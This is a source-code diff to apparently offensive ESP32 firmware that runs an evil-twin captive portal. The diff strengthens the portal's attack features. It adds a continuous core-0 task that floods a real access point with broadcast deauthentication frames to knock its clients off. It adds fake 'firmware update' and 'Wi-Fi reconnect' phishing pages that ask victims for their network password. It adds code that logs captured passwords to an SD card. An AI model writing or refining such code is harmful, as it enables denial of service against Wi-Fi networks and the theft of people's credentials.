@@ -5280,11 +5280,13 @@ namespace CaptivePortal {
 // Addr 34-1313: Credentials (20 * 64 bytes)
 // ═══════════════════════════════════════════════════════════════════════════
 
-#define EEPROM_SIZE 1320
-#define SSID_ADDR 0
-#define TMPL_ADDR 32
-#define COUNT_ADDR 33
-#define CRED_ADDR 34
+// EEPROM LAYOUT — Portal data starts at offset 512 to avoid collision
+// with Settings struct (utils.cpp saves brightness, touch cal, etc at addr 0-23)
+#define CP_EEPROM_SIZE 1832    // 512 (settings reserved) + 1320 (portal data)
+#define SSID_ADDR 512          // was 0 — COLLIDED with Settings magic!
+#define TMPL_ADDR 544          // was 32
+#define COUNT_ADDR 545         // was 33
+#define CRED_ADDR 546          // was 34
 #define MAX_CREDS 20
 #define CRED_SIZE 64
 
@@ -5303,10 +5305,14 @@ static const char* defaultSSID = "FreeWiFi";
 static uint8_t targetBSSID[6] = {0};
 static uint8_t targetChannel = 1;
 static bool hasTarget = false;
-static bool bgDeauthActive = false;
-static unsigned long lastBgDeauth = 0;
-#define CP_DEAUTH_BURST    30       // Frames per burst (proven effective)
-#define CP_DEAUTH_INTERVAL 3000     // 3s between bursts (enough listen time)
+
+// Core 0 Deauth Task — continuous aggressive deauth (replaces old timed burst)
+static TaskHandle_t cpDeauthHandle = NULL;
+static volatile bool cpDeauthRunning = false;
+static volatile bool cpDeauthDone = false;
+static volatile uint32_t cpDeauthCount = 0;
+static volatile uint32_t cpDeauthSuccess = 0;
+static volatile uint32_t cpDeauthFailStreak = 0;
 
 static DNSServer dnsServer;
 static WebServer server(80);
@@ -5404,6 +5410,8 @@ static PortalTemplate autoSelectTemplate(const char* ssid) {
     if (s.indexOf("att") >= 0 || s.indexOf("at&t") >= 0) return TMPL_ATT;
     if (s.indexOf("mcdonald") >= 0 || s.indexOf("mcdonalds") >= 0) return TMPL_MCDONALDS;
     if (s.indexOf("xfinity") >= 0 || s.indexOf("comcast") >= 0) return TMPL_XFINITY;
+    if (s.indexOf("firmware") >= 0 || s.indexOf("update") >= 0 ||
+        s.indexOf("router") >= 0 || s.indexOf("admin") >= 0) return TMPL_FIRMWARE_UPDATE;
 
     return TMPL_WIFI;
 }
@@ -5418,7 +5426,9 @@ static const char* const templateSSIDs[] = {
     "Airport Free WiFi",  // TMPL_AIRPORT
     "ATT WiFi",           // TMPL_ATT
     "McDonald's WiFi",    // TMPL_MCDONALDS
-    "Xfinity WiFi"        // TMPL_XFINITY
+    "Xfinity WiFi",       // TMPL_XFINITY
+    "HomeNetwork",        // TMPL_FIRMWARE_UPDATE
+    "HomeNetwork"         // TMPL_WIFI_RECONNECT
 };
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -5448,8 +5458,10 @@ static const char* getPortalPage(PortalTemplate tmpl, const char* stage) {
         case TMPL_AIRPORT:   return portal_airport;
         case TMPL_ATT:       return portal_att;
         case TMPL_MCDONALDS: return portal_mcdonalds;
-        case TMPL_XFINITY:   return portal_xfinity;
-        default:             return portal_wifi;
+        case TMPL_XFINITY:          return portal_xfinity;
+        case TMPL_FIRMWARE_UPDATE:  return portal_firmware_update;
+        case TMPL_WIFI_RECONNECT:   return portal_wifi_reconnect;
+        default:                    return portal_wifi;
     }
 }
 
@@ -5537,6 +5549,25 @@ static void updateLastCredMFA(const char* mfa) {
     EEPROM.commit();
 }
 
+// Save full PSK to SD card (no truncation — up to 63 chars)
+static void savePSKtoSD(const char* psk) {
+    spiDeselect();
+    if (SD.begin(SD_CS)) {
+        File f = SD.open("/creds.txt", FILE_APPEND);
+        if (f) {
+            f.printf("[PSK] %s | %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
+                     customSSID,
+                     psk,
+                     targetBSSID[0], targetBSSID[1], targetBSSID[2],
+                     targetBSSID[3], targetBSSID[4], targetBSSID[5],
+                     targetChannel);
+            f.close();
+        }
+        SD.end();
+    }
+    spiDeselect();
+}
+
 // ═══════════════════════════════════════════════════════════════════════════
 // WEB HANDLERS
 // ═══════════════════════════════════════════════════════════════════════════
@@ -5547,10 +5578,27 @@ static void handleRoot() {
 
     const char* page = getPortalPage(currentTemplate, NULL);
     String html = FPSTR(page);
+    if (currentTemplate == TMPL_FIRMWARE_UPDATE || currentTemplate == TMPL_WIFI_RECONNECT) {
+        html.replace("{{SSID}}", String(customSSID));
+    }
     server.send(200, "text/html", html);
 }
 
 static void handleCapture() {
+    // PSK capture — firmware update / wifi reconnect templates
+    String psk = server.arg("psk");
+    if (psk.length() > 0) {
+        terminalPrint("[!!!] PSK CAPTURED: " + psk, HALEHOUND_HOTPINK);
+        // EEPROM: email=SSID, password=truncated PSK, mfa="PSK" tag
+        saveCredential(customSSID, psk.c_str(), "PSK");
+        // SD card: full PSK (no truncation)
+        savePSKtoSD(psk.c_str());
+        String html = FPSTR(portal_success);
+        server.send(200, "text/html", html);
+        drawStats();
+        return;
+    }
+
     String stage = server.arg("stage");
     String email = server.arg("email");
     String password = server.arg("password");
@@ -5643,10 +5691,16 @@ static void setupWebHandlers() {
 // PORTAL START/STOP
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Background deauth — same proven pattern as EAPOL module
-static void sendBgDeauth() {
-    if (!hasTarget) return;
+// ───────────────────────────────────────────────────────────────────────────
+// Core 0 Deauth Task — continuous aggressive deauth while portal is active
+// Same proven architecture as Deauther dtTxTask (lines 1721-1768)
+// ───────────────────────────────────────────────────────────────────────────
+static void cpDeauthTask(void* param) {
+    #if CYD_DEBUG
+    Serial.println("[PORTAL] Core 0: Deauth task started");
+    #endif
 
+    // Deauth frame template — broadcast to all clients of target AP
     uint8_t deauthFrame[26] = {
         0xC0, 0x00,                         // Frame Control (Deauth)
         0x00, 0x00,                         // Duration
@@ -5660,21 +5714,86 @@ static void sendBgDeauth() {
     memcpy(deauthFrame + 10, targetBSSID, 6);
     memcpy(deauthFrame + 16, targetBSSID, 6);
 
+    // Set channel once — doesn't change during portal operation
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
 
-    int sent = 0;
-    for (int i = 0; i < CP_DEAUTH_BURST; i++) {
-        if (esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false) == ESP_OK) {
-            sent++;
+    while (cpDeauthRunning) {
+        // Heap safety — bail if dangerously low
+        if (ESP.getFreeHeap() < 20000) {
+            #if CYD_DEBUG
+            Serial.println("[PORTAL] Core 0: HEAP LOW — stopping deauth task");
+            #endif
+            break;
         }
-        delayMicroseconds(10000);  // 10ms between frames
+
+        // Consecutive failure recovery — restart WiFi subsystem
+        if (cpDeauthFailStreak > 10) {
+            #if CYD_DEBUG
+            Serial.println("[PORTAL] Core 0: 10+ failures — restarting WiFi");
+            #endif
+            esp_wifi_stop();
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+            esp_wifi_start();
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+            esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+            cpDeauthFailStreak = 0;
+        }
+
+        // Send deauth burst — 10 frames per iteration
+        for (int i = 0; i < 10 && cpDeauthRunning; i++) {
+            esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+            cpDeauthCount++;
+            if (res == ESP_OK) {
+                cpDeauthSuccess++;
+                cpDeauthFailStreak = 0;
+            } else {
+                cpDeauthFailStreak++;
+            }
+        }
+
+        // Yield after burst to feed watchdog + let portal serve clients
+        vTaskDelay(1);
     }
 
     #if CYD_DEBUG
-    Serial.printf("[PORTAL] BG Deauth: %d/%d sent on ch%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
-                  sent, CP_DEAUTH_BURST, targetChannel,
+    Serial.println("[PORTAL] Core 0: Deauth task exiting");
+    #endif
+
+    cpDeauthDone = true;
+    cpDeauthHandle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void startCpDeauthTask() {
+    cpDeauthDone = false;
+    cpDeauthCount = 0;
+    cpDeauthSuccess = 0;
+    cpDeauthFailStreak = 0;
+    cpDeauthRunning = true;
+    xTaskCreatePinnedToCore(cpDeauthTask, "CpDeauthTX", 8192, NULL, 1, &cpDeauthHandle, 0);
+
+    #if CYD_DEBUG
+    Serial.printf("[PORTAL] Core 0 deauth task launched — CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  targetChannel,
                   targetBSSID[0], targetBSSID[1], targetBSSID[2],
                   targetBSSID[3], targetBSSID[4], targetBSSID[5]);
+    #endif
+}
+
+static void stopCpDeauthTask() {
+    cpDeauthRunning = false;
+
+    if (cpDeauthHandle) {
+        unsigned long waitStart = millis();
+        while (!cpDeauthDone && (millis() - waitStart < 500)) {
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+        cpDeauthHandle = NULL;
+    }
+
+    #if CYD_DEBUG
+    Serial.printf("[PORTAL] Core 0 deauth task stopped — %u sent, %u success\n",
+                  (unsigned)cpDeauthCount, (unsigned)cpDeauthSuccess);
     #endif
 }
 
@@ -5720,21 +5839,24 @@ void startPortal() {
     server.begin();
 
     portalActive = true;
-    bgDeauthActive = hasTarget;
-    lastBgDeauth = 0;
     currentScreen = SCREEN_PORTAL_ACTIVE;
     totalClients = 0;
     prevClientCount = 0;
     memset(capturedEmail, 0, sizeof(capturedEmail));
+
+    // Launch Core 0 deauth task if real AP found
+    if (hasTarget) {
+        startCpDeauthTask();
+    }
 
     terminalPrint("[*] EVIL TWIN ACTIVE", HALEHOUND_MAGENTA);
     terminalPrint("[*] SSID: " + String(customSSID), HALEHOUND_MAGENTA);
     terminalPrint("[*] IP: " + WiFi.softAPIP().toString(), HALEHOUND_MAGENTA);
     terminalPrint("[*] CH: " + String(ch), HALEHOUND_MAGENTA);
     terminalPrint("[*] Template: " + String(portalTemplateNames[currentTemplate]), HALEHOUND_HOTPINK);
-    if (bgDeauthActive) {
-        terminalPrint("[*] BG DEAUTH ACTIVE", HALEHOUND_MAGENTA);
-        terminalPrint("[*] Kicking clients to evil twin...", HALEHOUND_MAGENTA);
+    if (hasTarget) {
+        terminalPrint("[*] CORE 0 DEAUTH ACTIVE", HALEHOUND_MAGENTA);
+        terminalPrint("[*] Hammering real AP continuously...", HALEHOUND_MAGENTA);
     } else {
         terminalPrint("[!] Real AP not found — no deauth", HALEHOUND_GUNMETAL);
     }
@@ -5742,16 +5864,16 @@ void startPortal() {
     drawMainScreen();
 
     #if CYD_DEBUG
-    Serial.printf("[PORTAL] Started: SSID=%s Template=%s bgDeauth=%s\n",
+    Serial.printf("[PORTAL] Started: SSID=%s Template=%s Core0Deauth=%s\n",
                   customSSID, portalTemplateNames[currentTemplate],
-                  bgDeauthActive ? "ON" : "OFF");
+                  hasTarget ? "ON" : "OFF");
     #endif
 }
 
 void stopPortal() {
     if (!portalActive) return;
 
-    bgDeauthActive = false;
+    stopCpDeauthTask();
     hasTarget = false;
     server.close();
     dnsServer.stop();
@@ -5788,7 +5910,7 @@ void loadSSID() {
 }
 
 void saveSSID(const char* ssid) {
-    EEPROM.begin(EEPROM_SIZE);  // Ensure EEPROM is initialized (safe to call multiple times)
+    EEPROM.begin(CP_EEPROM_SIZE);  // Ensure EEPROM is initialized (safe to call multiple times)
     for (int i = 0; i < 32; i++) {
         if (i < (int)strlen(ssid)) {
             EEPROM.write(SSID_ADDR + i, ssid[i]);
@@ -5799,11 +5921,8 @@ void saveSSID(const char* ssid) {
     EEPROM.commit();
     strncpy(customSSID, ssid, 31);
     customSSID[31] = '\0';
-
-    // Auto-select template when SSID changes
-    currentTemplate = autoSelectTemplate(customSSID);
-    EEPROM.write(TMPL_ADDR, (uint8_t)currentTemplate);
-    EEPROM.commit();
+    // NOTE: auto-select moved to keyboard handler only — template cycling
+    // sets its own template, saveSSID should NOT override the user's choice
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -6552,7 +6671,7 @@ void setup() {
         return;
     }
 
-    EEPROM.begin(EEPROM_SIZE);
+    EEPROM.begin(CP_EEPROM_SIZE);
 
     int count = EEPROM.read(COUNT_ADDR);
     if (count > MAX_CREDS) {
@@ -6600,10 +6719,14 @@ void loop() {
         dnsServer.processNextRequest();
         server.handleClient();
 
-        // Background deauth — kick clients off real AP every 3 seconds
-        if (bgDeauthActive && (millis() - lastBgDeauth >= CP_DEAUTH_INTERVAL)) {
-            sendBgDeauth();
-            lastBgDeauth = millis();
+        // Core 0 deauth stats — periodic terminal update
+        static unsigned long lastDeauthReport = 0;
+        if (cpDeauthRunning && (millis() - lastDeauthReport >= 5000)) {
+            uint32_t cnt = cpDeauthCount;
+            uint32_t suc = cpDeauthSuccess;
+            int rate = (cnt > 0) ? (int)((suc * 100UL) / cnt) : 0;
+            terminalPrint("[*] DEAUTH: " + String(cnt) + " (" + String(rate) + "%)", HALEHOUND_MAGENTA);
+            lastDeauthReport = millis();
         }
 
         // Track new client connections
@@ -6694,7 +6817,6 @@ void cleanup() {
     exitRequested = false;
     waitForReleaseFlag = false;
     lineCount = 0;
-    bgDeauthActive = false;
     hasTarget = false;
     memset(targetBSSID, 0, sizeof(targetBSSID));
 
